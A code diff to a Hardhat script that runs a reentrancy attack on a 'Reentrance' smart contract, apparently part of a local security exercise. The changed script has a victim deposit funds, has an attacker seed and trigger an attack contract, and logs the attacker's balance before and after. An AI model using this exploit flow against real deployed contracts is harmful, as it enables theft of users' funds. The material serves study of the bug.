@@ -1,7 +1,7 @@
 const hre = require('hardhat');
 
 async function main() {
-  const [owner] = await ethers.getSigners();
+  const [owner, attacker, victim] = await ethers.getSigners();
   const provider = ethers.provider;
 
   const reentrance = await ethers.getContractAt(
@@ -14,31 +14,32 @@ async function main() {
   );
 
   await (
-    await reentrance.donate(owner.address, {
+    await reentrance.connect(victim).donate(victim.address, {
       value: ethers.utils.parseEther('10'),
     })
   ).wait();
 
   await (
-    await reentrance.donate(attack.address, {
+    await reentrance.connect(attacker).donate(attack.address, {
       value: ethers.utils.parseEther('1'),
     })
   ).wait();
 
   await (
-    await owner.sendTransaction({
+    await attacker.sendTransaction({
       to: attack.address,
     })
   ).wait();
 
-  await (await attack.withdraw()).wait();
-
   console.log(
     `Attacker balance before :>> ${ethers.utils.formatEther(
-      (await provider.getBalance(owner.address)).toString(),
+      (await provider.getBalance(attacker.address)).toString(),
       '1'
     )}`
   );
+  
+  await (await attack.connect(attacker).withdraw()).wait();
+
   console.log(
     `Reentrance Contract balance :>> ${ethers.utils.formatEther(
       (await provider.getBalance(reentrance.address)).toString()
@@ -51,7 +52,7 @@ async function main() {
   );
   console.log(
     `Attacker balance after :>> ${ethers.utils.formatEther(
-      (await provider.getBalance(owner.address)).toString()
+      (await provider.getBalance(attacker.address)).toString()
     )}`
   );
 }
